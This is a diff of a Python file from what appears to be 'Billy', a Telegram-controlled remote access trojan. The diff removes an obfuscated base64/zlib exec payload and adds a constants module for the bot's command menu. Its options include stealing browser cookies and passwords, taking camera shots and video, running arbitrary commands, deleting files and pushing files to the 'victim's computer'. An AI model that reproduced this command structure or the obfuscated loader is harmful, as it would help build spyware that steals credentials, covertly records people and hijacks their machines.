@@ -1,5 +1,456 @@
-def _(__): return __import__('zlib').decompress(
-    __import__('base64').b64decode(__[::-1]))
+Linux_OS = 'Linux'
+Windows_OS = 'Windows'
+
+installation_notification = "\U0001f3af Billy is active!"
+
+timeout_error_message = "\U000023f0 The function took too long to execute and was terminated."
+exception_error_message = '\U0000274c The function failed with an error: "{ERROR}"'
+
+you_have_not_this_permission = '\U0001f6ab Sorry, but you haven\'t got this permission :('
 
 
-exec((_)(b'==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'))
+ABOUT = 'about'
+ABOUT_preview = '\U00002753About'
+ABOUT_module = 'About'
+
+ABOUT_GETVERSION = 'about/getversion'
+ABOUT_GETVERSION_preview = 'Version'
+ABOUT_GETVERSION_handler = 'About.getversion_callback'
+
+ABOUT_AUTHOR = 'about/author'
+ABOUT_AUTHOR_preview = 'Author'
+ABOUT_AUTHOR_handler = 'About.author_callback'
+
+
+ADMIN = 'admin'
+ADMIN_preview = '\U0001f510 Admin'
+ADMIN_module = 'Admin'
+
+ADMIN_DELETE = 'admin/delete'
+ADMIN_DELETE_preview = 'Delete Billy'
+ADMIN_DELETE_command = 'delete'
+ADMIN_DELETE_documentation = f'This option delete Billy. If you sure, that you want to delete him, /{ADMIN_DELETE_command}.'
+
+ADMIN_UPDATE = 'admin/update'
+ADMIN_UPDATE_preview = 'Update Billy'
+ADMIN_UPDATE_command = 'update'
+ADMIN_UPDATE_documentation = f'This option delete Billy. If you want to update him, /{ADMIN_UPDATE_command}.'
+
+ADMIN_GETLOGS = 'admin/getlogs'
+ADMIN_GETLOGS_preview = 'Get logs'
+ADMIN_GETLOGS_command = 'getlogs'
+ADMIN_GETLOGS_documentation = f"This function allows you to retrieve logs. Response format: Log table.\nCommand: /{ADMIN_GETLOGS_command}"
+
+ADMIN_CLEARLOGS = 'admin/clearlogs'
+ADMIN_CLEARLOGS_preview = 'Clear logs'
+ADMIN_CLEARLOGS_handler = 'Admin.clearlogs_callback'
+
+ADMIN_STOPBILLY = 'admin/stopBilly'
+ADMIN_STOPBILLY_preview = 'Stop Billy'
+ADMIN_STOPBILLY_command = 'stopBilly'
+ADMIN_STOPBILLY_documentation = f'This function allows you to temporarily stop Billy (until the next system boot).\nCommand: /{ADMIN_STOPBILLY_command}'
+
+ADMIN_MANAGEPERMISSIONS = 'admin/managepermissions'
+ADMIN_MANAGEPERMISSIONS_preview = 'Manage permissions'
+ADMIN_MANAGEPERMISSIONS_handler = 'Admin.managepermissions_callback'
+ADMIN_MANAGEPERMISSIONS_command = 'managepermissions'
+ADMIN_MANAGEPERMISSIONS_documentation = f"This mode allows you to manage permissions. \nSyntax: /{ADMIN_MANAGEPERMISSIONS_command} [telegram id]\n"
+
+SAVEPERMISSIONS = 'admin/savepermissions'
+SAVEPERMISSIONS_preview = 'Save'
+SAVEPERMISSIONS_handler = 'Admin.savepermissions_callback'
+SAVEPERMISSIONS_permission = ADMIN_MANAGEPERMISSIONS
+
+RESETPERMISSIONS = 'admin/resetpermissions'
+RESETPERMISSIONS_preview = 'Reset'
+RESETPERMISSIONS_handler = 'Admin.resetpermissions_callback'
+RESETPERMISSIONS_permission = ADMIN_MANAGEPERMISSIONS
+
+CANCELPERMISSIONS = 'admin/cancelpermissions'
+CANCELPERMISSIONS_preview = 'Cancel'
+CANCELPERMISSIONS_handler = 'Admin.cancelpermissions_callback'
+CANCELPERMISSIONS_permission = ADMIN_MANAGEPERMISSIONS
+
+
+BROWSER = 'browser'
+BROWSER_preview = '\U0001f310 Browser'
+BROWSER_module = 'Browser'
+
+BROWSER_OPENURL = 'browser/openurl'
+BROWSER_OPENURL_preview = "Open url"
+BROWSER_OPENURL_command = 'openurl'
+BROWSER_OPENURL_documentation = f'This mode allows you to ropen url in a browser. \nSyntax: /{BROWSER_OPENURL_command} [url].'
+
+BROWSER_STEALCOOKIE = 'browser/stealcookie'
+BROWSER_STEALCOOKIE_preview = "Steal cookie"
+BROWSER_STEALCOOKIE_handler = 'Browser.stealcookie_callback'
+
+BROWSER_STEALPASSWORDS = 'browser/stealpasswords'
+BROWSER_STEALPASSWORDS_preview = "Steal passwords"
+BROWSER_STEALPASSWORDS_handler = 'Browser.stealpasswords_callback'
+
+
+CAMERA = 'camera'
+CAMERA_preview = '\U0001f4f8 Camera'
+CAMERA_module = 'Camera'
+
+CAMERA_SHOT = 'camera/shot'
+CAMERA_SHOT_preview = 'Shot'
+CAMERA_SHOT_handler = 'Camera.shot_callback'
+CAMERA_SHOT_command = 'camerashot'
+CAMERA_SHOT_documentation = f"This mode allows you to shot.\n{'{available_cameras}'} \nSyntax: /{CAMERA_SHOT_command} [device]."
+
+CAMERA_VIDEO = 'camera/video'
+CAMERA_VIDEO_preview = 'Video'
+CAMERA_VIDEO_handler = 'Camera.video_callback'
+CAMERA_VIDEO_command = 'cameravideo'
+CAMERA_VIDEO_documentation = f"This mode allows you to record a video.\n{'{available_cameras}'} \nSyntax: /{CAMERA_VIDEO_command} [device] [time] (seconds, no more than {'{max_time_to_camera}'} seconds)."
+
+
+COMMAND = 'command'
+COMMAND_preview = '\U0001f4bb Command'
+COMMAND_module = 'Command'
+
+COMMAND_RUNCOMMAND = 'command/runcommand'
+COMMAND_RUNCOMMAND_preview = 'Run command'
+COMMAND_RUNCOMMAND_command = 'runcommand'
+COMMAND_RUNCOMMAND_documentation = f"This mode allows you to run command. \nSyntax: /{COMMAND_RUNCOMMAND_command} [command]."
+
+
+FILE = 'file'
+FILE_preview = '\U0001f4c1 File'
+FILE_module = 'File'
+
+FILE_GETINF = 'file/getinf'
+FILE_GETINF_preview = 'Get information'
+FILE_GETINF_command = 'getinffile'
+FILE_GETINF_documentation = f"This mode allows you to get information about file or directory. \nSyntax: /{FILE_GETINF_command} [path]."
+
+FILE_CREATEFILE = 'file/createfile'
+FILE_CREATEFILE_preview = 'Create file'
+FILE_CREATEFILE_command = 'createfile'
+FILE_CREATEFILE_handler = 'File.createfile_callback'
+FILE_CREATEFILE_documentation = f"This mode allows you to create file. \nSyntax: /{FILE_CREATEFILE_command} [path] {'{special_separator}'} [value]."
+
+FILE_CREATEDIR = 'file/createdir'
+FILE_CREATEDIR_preview = 'Create directory'
+FILE_CREATEDIR_command = 'createdir'
+FILE_CREATEDIR_documentation = f"This mode allows you to create directory. \nSyntax: /{FILE_CREATEDIR_command} [path]."
+
+FILE_COPY = 'file/copy'
+FILE_COPY_preview = 'Copy file'
+FILE_COPY_command = 'copyfile'
+FILE_COPY_handler = 'File.copy_callback'
+FILE_COPY_documentation = f"This mode allows you to copy file. \nSyntax: /{FILE_COPY_command} [path1] {'{special_separator}'} [path2]."
+
+FILE_REMOVE = 'file/remove'
+FILE_REMOVE_preview = 'Remove file or dir'
+FILE_REMOVE_command = 'remove'
+FILE_REMOVE_documentation = f"This mode allows you to remove file or directory. \nSyntax: /{FILE_REMOVE_command} [path]."
+
+FILE_UPLOAD = 'file/upload'
+FILE_UPLOAD_preview = 'Upload file'
+FILE_UPLOAD_command = 'upload'
+FILE_UPLOAD_handler = 'File.upload_callback'
+FILE_UPLOAD_documentation = f"This mode allows you to upload file to network drive. \nSyntax: /{FILE_UPLOAD_command} [file path]"
+
+FILE_DOWNLOAD = 'file/download'
+FILE_DOWNLOAD_preview = 'Download file'
+FILE_DOWNLOAD_command = 'download'
+FILE_UPLOAD_handler = 'File.download_callback'
+FILE_DOWNLOAD_documentation = f"This mode allows you to download file to victim's computer. \nSyntax: /{FILE_DOWNLOAD_command} [file path]. Also You must attach a file to a message."
+
+
+KEYBOARD = 'keyboard'
+KEYBOARD_preview = '\U00002328 Keyboard'
+KEYBOARD_module = 'Keyboard'
+
+KEYBOARD_SPAM = 'keyboard/spam'
+KEYBOARD_SPAM_preview = 'Spam'
+KEYBOARD_SPAM_command = 'keyboardspam'
+KEYBOARD_SPAM_handler = 'Keyboard.spam_callback'
